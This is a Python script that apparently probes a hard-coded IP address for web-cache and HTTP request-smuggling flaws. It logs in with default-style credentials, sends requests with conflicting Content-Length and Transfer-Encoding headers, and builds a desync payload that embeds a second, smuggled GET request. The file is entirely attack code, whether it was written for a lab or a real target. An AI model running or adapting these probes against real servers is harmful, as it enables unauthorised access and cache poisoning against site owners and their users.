import requests
import time

SERVER_URL = "http://54.198.62.41"

def login_user(username="user", password="user123"):
    login_data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def test_basic_cache():
    """Test if basic caching is working"""
    user_token = login_user()
    print("\n[1] Testing basic cache functionality...")
    
    headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key'
    }
    
    # First request
    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=headers)
    print("\nFirst Request:")
    print(f"Status: {r1.status_code}")
    print(f"Headers: {dict(r1.headers)}")
    first_content = r1.text
    
    # Second request - should be cached
    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=headers)
    print("\nSecond Request (Should be cached):")
    print(f"Status: {r2.status_code}")
    print(f"Headers: {dict(r2.headers)}")
    
    is_same = first_content == r2.text
    print(f"\nContent is same: {is_same}")
    
def test_basic_smuggling():
    """Test if HTTP smuggling is possible"""
    user_token = login_user()
    print("\n[2] Testing basic HTTP smuggling...")
    
    # Try a basic smuggled request
    headers = {
        'Authorization': f'Bearer {user_token}',
        'Content-Length': '4',
        'Transfer-Encoding': 'chunked'
    }
    
    # Send malformed request
    data = "0\r\n\r\nX"  # Malformed chunk
    
    try:
        r = requests.post(f"{SERVER_URL}/api/blog/post/1", 
                         headers=headers,
                         data=data,
                         timeout=5)
        print("Response received:")
        print(f"Status: {r.status_code}")
        print(f"Headers: {dict(r.headers)}")
        print(f"Content: {r.text[:200]}")
    except requests.exceptions.ReadTimeout:
        print("Request timed out - might indicate successful smuggling")
    except Exception as e:
        print(f"Error: {str(e)}")

def test_front_back_desync():
    """Test for front/back end desync"""
    user_token = login_user()
    print("\n[3] Testing front/back end desync...")
    
    # Create a request with ambiguous length
    main_request = (
        "POST /api/blog/post/1 HTTP/1.1\r\n"
        f"Host: {SERVER_URL}\r\n"
        f"Authorization: Bearer {user_token}\r\n"
        "Content-Length: 44\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /api/blog/post/2 HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "\r\n"
    )
    
    headers = {
        'Authorization': f'Bearer {user_token}',
        'Content-Length': str(len(main_request)),
        'Transfer-Encoding': 'chunked'
    }
    
    try:
        r = requests.post(f"{SERVER_URL}/api/blog/post/1",
                         headers=headers,
                         data=main_request,
                         timeout=5)
        print("Response received:")
        print(f"Status: {r.status_code}")
        print(f"Headers: {dict(r.headers)}")
        print(f"Content: {r.text[:200]}")
    except requests.exceptions.ReadTimeout:
        print("Request timed out - might indicate successful smuggling")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    print("[+] Starting basic vulnerability verification...")
    
    print("\n=== Cache Tests ===")
    test_basic_cache()
    
    print("\n=== HTTP Smuggling Tests ===")
    test_basic_smuggling()
    
    print("\n=== Front/Back Desync Tests ===")
    test_front_back_desync()